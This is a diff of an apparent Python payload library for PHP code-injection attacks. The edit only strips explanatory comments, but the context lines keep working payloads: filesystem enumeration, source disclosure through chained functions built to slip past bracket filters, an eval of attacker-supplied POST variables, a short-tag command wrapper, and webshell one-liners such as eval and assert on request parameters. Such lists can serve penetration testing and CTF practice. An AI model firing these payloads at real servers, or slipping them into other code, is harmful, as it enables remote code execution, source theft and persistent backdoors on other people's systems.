@@ -59,8 +59,6 @@ PHPINFO_TEMPLATES = [
     "show_source(current(array_reverse(scandir(getcwd()))));",
 ]
 
-# Directory enumeration payloads extracted from eg.md.
-# These focus on nested function composition for path traversal-like listing.
 DIRECTORY_ENUM_TEMPLATES = [
     "print_r(scandir('/'));",
     "var_dump(scandir('/'));",
@@ -82,7 +80,6 @@ DIRECTORY_ENUM_TEMPLATES = [
     "var_export(glob('../../../*'));",
 ]
 
-# File selection payloads for scenarios where [] indexing is filtered.
 FILE_ENUM_TEMPLATES = [
     "show_source(next(array_reverse(scandir(getcwd()))));",
     "echo highlight_file(current(array_reverse(scandir(pos(localeconv())))));",
@@ -90,7 +87,6 @@ FILE_ENUM_TEMPLATES = [
 ]
 
 # Variable scope hijacking payload:
-# attacker places executable code into POST values, then eval fetches and executes it.
 VARIABLE_HIJACK_TEMPLATES = [
     "eval(array_pop(next(get_defined_vars())));",
 ]
@@ -115,7 +111,6 @@ UPLOAD_EXEC_TEMPLATES = [
 ]
 
 # Article final POC wrapper integration
-# Wrapper only, no behavior change to existing templates.
 UPLOAD_EXEC_WRAPPER_TEMPLATES = [
     "?><?=`{cmd}`;?>",
 ]
@@ -175,7 +170,7 @@ INCLUDE_TEMPLATES = [
     "require_once('{path}');",
 ]
 
-# Webshell Templates (Param Exec)
+# Webshell Templates
 WEBSHELL_TEMPLATES = [
     "eval($_GET[x]);&x=system('{cmd}');",
     "assert($_POST[x]);",
